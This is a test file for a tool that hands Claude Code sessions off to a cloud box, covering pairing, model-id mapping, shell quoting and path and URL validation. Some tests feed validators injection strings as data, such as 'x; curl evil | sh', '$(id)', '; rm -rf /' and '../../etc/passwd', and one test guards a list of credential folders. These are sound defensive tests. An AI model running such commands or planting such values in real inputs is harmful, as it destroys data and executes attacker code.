import { describe, expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { b64url, generateEphemeralKeyPair } from "../core/crypto";
import { buildPairURL } from "../core/pair-url";
import {
  BOX_MACHINE_NAME, bakeScript, checkLaunchIds, PAIR_FN, PAIR_POLL, packRefusal, SHM_SWEEP, targetWorker, userLayerFiles, boxPairPayload, createBody, lastModel, latestSession, paneScript, projectDirName,
  pubRawFromPkcs8, q, RELAY_PORT, resultPage, takePairUrl, toOpenRouterModel, withReload,
} from "./handoff";
import { RELAY_PORT as RELAY_LISTEN_PORT } from "./or-relay";
import { BACK_FILES, backPackScript, backStopScript, backWaitScript, currentGuard, resumeCommand } from "./handoff";
import { boxIdle } from "../core/cloud-back";

describe("handoff pure logic", () => {
  test("cwd → Claude Code project dir name (every non-alphanumeric → -)", () => {
    expect(projectDirName("/Users/me/my-app")).toBe("-Users-me-my-app");
    expect(projectDirName("/Users/me/app/.claude/worktrees/x")).toBe("-Users-me-app--claude-worktrees-x");
    expect(projectDirName("/a/custom_nodes/b.c")).toBe("-a-custom-nodes-b-c");
  });

  test("model id → OpenRouter id", () => {
    expect(toOpenRouterModel("claude-opus-5-5")).toBe("anthropic/claude-opus-5.5");
    expect(toOpenRouterModel("claude-haiku-5-5")).toBe("anthropic/claude-haiku-5.5");
    expect(toOpenRouterModel("claude-sonnet-4-5-20250929")).toBe("anthropic/claude-sonnet-4.5");
    expect(toOpenRouterModel("claude-opus-5-5[1m]")).toBe("anthropic/claude-opus-5.5");
    expect(toOpenRouterModel("anthropic/claude-haiku-5.5")).toBe("anthropic/claude-haiku-5.5");
  });

  test("last real model wins; synthetic rows and torn lines are skipped", () => {
    const jsonl = [
      JSON.stringify({ type: "assistant", message: { model: "claude-haiku-5-5" } }),
      JSON.stringify({ type: "assistant", message: { model: "claude-opus-5-5" } }),
      JSON.stringify({ type: "assistant", message: { model: "<synthetic>" } }),
      '{"type":"assistant","mess',
    ].join("\n");
    expect(lastModel(jsonl)).toBe("claude-opus-5-5");
    expect(lastModel("")).toBeUndefined();
  });

  test("a box-touched transcript's OpenRouter id still wins, and maps back for the box", () => {
    const jsonl = [
      JSON.stringify({ type: "assistant", message: { model: "claude-opus-5-5" } }),
      JSON.stringify({ type: "assistant", message: { model: "anthropic/claude-haiku-5.5" } }),
    ].join("\n");
    expect(lastModel(jsonl)).toBe("claude-haiku-5-5");
    expect(toOpenRouterModel(lastModel(jsonl)!)).toBe("anthropic/claude-haiku-5.5");
  });

  test("latest session = newest .jsonl; dirs like memory/ ignored", () => {
    expect(latestSession([
      { name: "a.jsonl", mtimeMs: 1 }, { name: "memory", mtimeMs: 9 }, { name: "b.jsonl", mtimeMs: 5 },
    ])).toBe("b");
    expect(latestSession([{ name: "memory", mtimeMs: 1 }])).toBeUndefined();
  });

  test("shell quoting survives a single quote", () => {
    expect(q("it's")).toBe(`'it'\\''s'`);
  });

  test("pkcs8 private key → the same raw public key pairStart put in the QR", async () => {
    const kp = await generateEphemeralKeyPair();
    expect(b64url(await pubRawFromPkcs8(kp.privPkcs8))).toBe(b64url(kp.pubRaw));
  });

  test("box pair payload: stamps machineName, rebuilds the exact pairing URL", async () => {
    const kp = await generateEphemeralKeyPair();
    const qr = new Uint8Array(16).fill(7);
    const pending = { url: "https://api.nomo.gg", pairingId: "ab".repeat(16), pcSecret: "x", qrSecretB64: b64url(qr), pcEphPrivB64: b64url(kp.privPkcs8), createdAt: 1 };
    const { config, url } = await boxPairPayload(JSON.stringify(pending), BOX_MACHINE_NAME, buildPairURL);
    expect(url).toBe(buildPairURL(pending.url, pending.pairingId, qr, kp.pubRaw));
    expect(JSON.parse(config)).toEqual({ ...pending, machineName: "Nomo Cloud" });
    await expect(boxPairPayload(JSON.stringify({ ...pending, e2eKeyB64: "k" }), "n", buildPairURL)).rejects.toThrow();
    await expect(boxPairPayload("{}", "n", buildPairURL)).rejects.toThrow();
  });

  test("the pairing URL marker is split out of box stdout, never echoed", () => {
    expect(takePairUrl("pane\nNOMO_PAIR_URL=nomo://pair?v=1&p=x\nmore")).toEqual({ url: "nomo://pair?v=1&p=x", rest: "pane\nmore" });
    expect(takePairUrl("just pane")).toEqual({ url: undefined, rest: "just pane" });
  });

  test("claude's base URL is the port the relay listens on", () => {
    expect(RELAY_PORT).toBe(RELAY_LISTEN_PORT);
  });

  test("create body: baked template XOR the omg preset, same size, per-Mac external id", () => {
    expect(createBody(true, "m")).toEqual({ templateId: "nomo-base", size: "pro", externalUserId: "m" });
    expect(createBody(false, "m")).toEqual({ template: "omg", size: "pro", externalUserId: "m" });
  });

  test("the bake script carries no credentials or session state, and scrubs before the snapshot", () => {
    const s = bakeScript('{"name":"nomo"}');
    expect(s).not.toMatch(/ANTHROPIC|OPENROUTER|AUTH_TOKEN|API_KEY|credentials/);
    expect(s).toContain("claude plugin install nomo-cc@nomo");
    expect(s).toMatch(/rm -rf .*\/root\/\.config\/cc-status .*\/root\/\.claude\/projects/);
  });

  test("user text reaches tmux only through env, never the script", () => {
    expect(paneScript("send")).toContain(`send-keys -t nomo -l -- "$NOMO_TEXT"`);
    expect(paneScript("key")).toContain(`send-keys -t nomo -- "$NOMO_KEY"`);
    expect(paneScript("screen")).toContain("capture-pane -p -t nomo");
  });

  test("the pending pair page reloads itself; the result page carries no QR", () => {
    expect(withReload("<html><head><title>x</title>")).toContain(`<head>\n<meta http-equiv="refresh" content="3">`);
    const done = resultPage("Paired ✓", "close");
    expect(done).toContain("Paired ✓");
    expect(done).not.toMatch(/<svg|refresh|nomo:\/\//);
  });

  test("target worker: --worker, then the Mac's env, then production; origins only", () => {
    expect(targetWorker("https://stg.example.dev/", "https://env.example")).toBe("https://stg.example.dev");
    expect(targetWorker(undefined, "https://env.example")).toBe("https://env.example");
    expect(targetWorker(true, undefined)).toBe("https://api.nomo.gg");
    expect(() => targetWorker("api.nomo.gg; rm -rf /", undefined)).toThrow();
  });

  test("target worker: https only, http just for loopback, never userinfo or a path", () => {
    expect(targetWorker("http://localhost:8787", undefined)).toBe("http://localhost:8787");
    expect(targetWorker("http://127.0.0.1:8787", undefined)).toBe("http://127.0.0.1:8787");
    expect(targetWorker("http://[::1]:8787", undefined)).toBe("http://[::1]:8787");
    expect(() => targetWorker("http://staging.example.workers.dev", undefined)).toThrow(/https/);
    expect(() => targetWorker("https://user:pw@staging.example.workers.dev", undefined)).toThrow();
    expect(() => targetWorker("https://api.nomo.gg@evil.example", undefined)).toThrow();
    expect(() => targetWorker("https://staging.example.workers.dev/path", undefined)).toThrow();
    expect(() => targetWorker("ftp://staging.example.workers.dev", undefined)).toThrow();
  });

  test("a folder is never packed whole when it is, or holds, home or a credential store", () => {
    const none = () => false;
    expect(packRefusal("/home/me", "/home/me", none)).toMatch(/home folder/);
    expect(packRefusal("/home", "/home/me", none)).toMatch(/home folder/);
    expect(packRefusal("/", "/home/me", none)).toMatch(/home folder/);
    expect(packRefusal("/home/me/app", "/home/me", none)).toBeUndefined();
    expect(packRefusal("/srv/app", "/home/me", none)).toBeUndefined();
    expect(packRefusal("/home/me/..odd", "/home/me", none)).toBeUndefined();
    for (const p of [".claude", ".config/cc-status", ".ssh", ".gnupg", ".aws", "Library/Keychains"]) {
      expect(packRefusal("/home/me/app", "/home/me", (x) => x === `/home/me/app/${p}`)).toBe(`/home/me/app contains ${p}`);
    }
  });

  test("session id must be a UUID and the model a plain id before either reaches the launch line", () => {
    const u = "0b5c3d1e-2f4a-4b6c-8d9e-0f1a2b3c4d5e";
    expect(() => checkLaunchIds(u, "anthropic/claude-opus-5.5")).not.toThrow();
    expect(() => checkLaunchIds(u, "anthropic/claude-opus-5.5[1m]")).not.toThrow();
    expect(() => checkLaunchIds(u, "x; curl evil | sh")).toThrow(/model id/);
    expect(() => checkLaunchIds(u, "$(id)")).toThrow(/model id/);
    expect(() => checkLaunchIds(u, "")).toThrow(/model id/);
    expect(() => checkLaunchIds("../../etc/passwd", "m")).toThrow(/UUID/);
    expect(() => checkLaunchIds(`${u}; rm -rf /`, "m")).toThrow(/UUID/);
  });

  test("user layer: links inside their folder are followed, links outside it are skipped", () => {
    const d = mkdtempSync(join(tmpdir(), "nomo-layer-"));
    const home = join(d, ".claude"), outside = join(d, "outside");
    mkdirSync(join(home, "skills", "real"), { recursive: true });
    mkdirSync(outside, { recursive: true });
    writeFileSync(join(home, "skills", "real", "SKILL.md"), "x");
    writeFileSync(join(outside, "secret"), "s");
    writeFileSync(join(home, ".credentials.json"), "{}");
    writeFileSync(join(outside, "CLAUDE.md"), "# mine");
    symlinkSync(join(home, "skills", "real"), join(home, "skills", "alias"));      // inside → followed
    symlinkSync(outside, join(home, "skills", "escape"));                         // outside → skipped
    symlinkSync(join(home, ".credentials.json"), join(home, "skills", "creds"));  // ~/.claude but not skills → skipped
    symlinkSync(join(home, "skills"), join(home, "skills", "real", "loop"));      // a loop → not walked forever
    symlinkSync(join(outside, "CLAUDE.md"), join(home, "CLAUDE.md"));             // top-level file link → followed
    const { files, skipped } = userLayerFiles(home, ["skills", "CLAUDE.md"]);
    expect(files.sort()).toEqual(["CLAUDE.md", "skills/alias/SKILL.md", "skills/real/SKILL.md"]);
    expect(skipped.sort()).toEqual(["skills/creds", "skills/escape"]);
  });

  test("every non-handoff box script first drops a stale /dev/shm/nomo-env", () => {
    for (const s of [paneScript("send"), paneScript("key"), paneScript("screen"), PAIR_POLL]) expect(s.startsWith(SHM_SWEEP)).toBe(true);
    expect(SHM_SWEEP).toContain("-mmin +1"); // never one a handoff in flight just wrote
  });

  // nomo_pair run for real in bash, with the box paths pointed at a temp dir and bun/tmux stubbed.
  function runPair(config: object | null, worker?: string): string {
    const d = mkdtempSync(join(tmpdir(), "nomo-pairfn-"));
    const cc = join(d, "cc"), plug = join(d, "cache", "nomo", "nomo-cc", "2.3.8"), bin = join(d, "bin");
    for (const x of [cc, join(plug, "dist"), bin]) mkdirSync(x, { recursive: true });
    if (config) writeFileSync(join(cc, "config.json"), JSON.stringify(config));
    writeFileSync(join(bin, "bun"), `#!/bin/sh\necho "bun $* W=$NOMO_WORKER_URL" >> ${d}/calls\n`);
    writeFileSync(join(bin, "tmux"), "#!/bin/sh\nexit 0\n");
    chmodSync(join(bin, "bun"), 0o755); chmodSync(join(bin, "tmux"), 0o755);
    const fn = PAIR_FN.replaceAll("/root/.config/cc-status", cc).replaceAll("/root/.claude/plugins/cache", join(d, "cache"));
    const out = execFileSync("bash", ["-c", `${fn}\nnomo_pair; cat ${d}/calls 2>/dev/null || true`], {
      env: { PATH: `${bin}:/usr/bin:/bin`, ...(worker ? { NOMO_WORKER_URL: worker } : {}) },
    }).toString();
    return out;
  }

  test("box pairing: same worker → kept; different worker → re-paired to the target", () => {
    const stg = "https://staging.example.workers.dev";
    expect(runPair({ url: "https://api.nomo.gg", e2eKeyB64: "k" })).toBe("NOMO_PAIRED\n");
    expect(runPair({ url: stg, e2eKeyB64: "k" }, stg)).toBe("NOMO_PAIRED\n");
    const re = runPair({ url: "https://api.nomo.gg", e2eKeyB64: "k" }, stg);
    expect(re).toContain("NOMO_REPAIR: https://api.nomo.gg");
    expect(re).toContain(`dist/pair.mjs W=${stg}`);
    expect(runPair(null)).toContain("dist/pair.mjs W=https://api.nomo.gg");
  });
});

describe("bring back (--back)", () => {
  const U = "11111111-2222-3333-4444-555555555555";
  const scripts = [backPackScript(U, "-tmp-proj", "/tmp/proj", true), backPackScript(U, "-tmp-proj", "/tmp/proj", false)];

  test("the pack never reaches .claude.json, /dev/shm or cc-status (beyond the sweep and the excludes)", () => {
    for (const s of scripts) {
      expect(s.startsWith(SHM_SWEEP)).toBe(true);
      const body = s.slice(SHM_SWEEP.length).replace(/--exclude '[^']*'/g, "");
      for (const bad of [".claude.json", "/dev/shm", "cc-status", ".credentials"]) expect(body).not.toContain(bad);
      expect(s).toContain("--exclude '.config/cc-status'");
    }
    expect([...BACK_FILES]).toEqual(["repo.bundle", "wip.patch", "untracked.tgz", "project.tgz", "folder.tgz"]);
  });

  test("every box script is valid bash", () => {
    for (const s of [...scripts, backStopScript(U), backWaitScript(U, "-tmp-proj")]) execFileSync("bash", ["-n", "-c", s]);
  });

  test("--back --session X never stops a different session (unless --force)", () => {
    for (const s of [backStopScript(U), backWaitScript(U, "-tmp-proj")]) expect(s).toContain(currentGuard(U));
    const f = join(mkdtempSync(join(tmpdir(), "nomo-cur-")), "cur");
    const run = (env: Record<string, string> = {}) =>
      execFileSync("bash", ["-c", `${currentGuard(U, f)}\necho NOMO_SAME`], { env: { PATH: process.env.PATH!, ...env } }).toString().trim();
    expect(run()).toBe("NOMO_OTHER="); // nothing recorded (a pre-2.3.12 box)
    writeFileSync(f, "99999999-2222-3333-4444-555555555555");
    expect(run()).toBe("NOMO_OTHER=99999999-2222-3333-4444-555555555555");
    expect(run({ NOMO_FORCE: "1" })).toBe("NOMO_SAME");
    writeFileSync(f, U);
    expect(run()).toBe("NOMO_SAME");
    writeFileSync(f, "\x1b[2Jevil;rm -rf /");
    expect(run()).toBe("NOMO_OTHER=2e-f");
  });

  test("boxIdle: Nomo's record wins; needsAttention asks the user; sessionStart asks the transcript", () => {
    const end = JSON.stringify({ type: "assistant", message: { stop_reason: "end_turn" } });
    const tool = JSON.stringify({ type: "assistant", message: { stop_reason: "tool_use" } });
    expect(boxIdle({ lastEvent: "done", tail: "", quietS: 0 })).toBe("idle");
    // A compact's SessionStart fires mid-turn: not idle on its own.
    expect(boxIdle({ lastEvent: "sessionStart", tail: "", quietS: 99 })).toBe("busy");
    expect(boxIdle({ lastEvent: "sessionStart", tail: tool, quietS: 99 })).toBe("busy");
    expect(boxIdle({ lastEvent: "sessionStart", tail: end, quietS: 5 })).toBe("busy");
    expect(boxIdle({ lastEvent: "sessionStart", tail: end, quietS: 20 })).toBe("idle");
    expect(boxIdle({ lastEvent: "needsAttention", tail: "", quietS: 99 })).toBe("attention");
    expect(boxIdle({ lastEvent: "working", tail: "", quietS: 99 })).toBe("busy");
  });

  test("boxIdle without a record: end_turn + meta only + 15s quiet; a torn tail is fine", () => {
    const end = JSON.stringify({ type: "assistant", message: { stop_reason: "end_turn" } });
    const tool = JSON.stringify({ type: "assistant", message: { stop_reason: "tool_use" } });
    const meta = JSON.stringify({ type: "system", subtype: "stop_hook_summary" });
    const user = JSON.stringify({ type: "user", message: { content: "next" } });
    const torn = 'ant","message":{"stop_reason":"tool_use"}}';
    expect(boxIdle({ tail: [torn, end, meta, ""].join("\n"), quietS: 20 })).toBe("idle");
    expect(boxIdle({ tail: [torn, end].join("\n"), quietS: 5 })).toBe("busy");
    expect(boxIdle({ tail: [end, user].join("\n"), quietS: 60 })).toBe("busy");
    expect(boxIdle({ tail: [end, tool].join("\n"), quietS: 60 })).toBe("busy");
    expect(boxIdle({ tail: [end, '{"type":"assis'].join("\n"), quietS: 60 })).toBe("idle");
    expect(boxIdle({ tail: torn, quietS: 60 })).toBe("busy");
  });

  test("the resume line is one quoted exec", () => {
    expect(resumeCommand("/tmp/it's here", U)).toBe(`cd '/tmp/it'\\''s here' && exec claude --resume ${U}`);
  });
});
